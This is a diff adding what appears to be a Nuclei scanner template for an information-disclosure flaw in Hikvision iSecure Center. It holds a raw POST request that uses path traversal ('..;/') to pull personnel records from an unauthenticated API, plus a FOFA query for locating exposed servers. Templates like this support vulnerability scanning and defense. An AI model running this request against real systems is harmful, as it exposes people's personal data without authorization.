@@ -1,0 +1,29 @@
+id: hikvision-iSecure-Center-person-find-disclosure
+
+info:
+  name: 海康威视综合安防管理平台 person find - disclousre
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - todo
+  metadata:
+    verified: false
+    fofa-query: app="HIKVISION-iSecure-Center" || app="HIKVISION-综合安防管理平台" || icon_hash="-808437027" || title="综合安 防管理平台"
+  tags: disclosure,hikvision
+
+http:
+  - raw:
+      - |
+        POST /isupm/api/api/..;/..;/person/find HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=utf-8
+
+        {"organizationId":"root000000","pageSize":100,"pageNo":1,"name":"","casecadeSubOrganization":1}
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'personIndexCode')
+        condition: and
